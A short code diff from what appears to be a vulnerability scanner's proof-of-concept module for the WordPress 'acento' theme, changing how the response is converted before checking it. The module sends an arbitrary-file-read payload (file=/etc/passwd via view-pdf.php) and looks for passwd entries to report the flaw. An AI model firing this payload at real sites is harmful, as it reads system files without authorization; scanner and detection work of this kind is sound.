@@ -53,7 +53,7 @@ class Poc(ABPoc):
                 "/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/etc/passwd"
             request = urllib.request.Request(verify_url)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             if 'root:' in content and 'nobody:' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
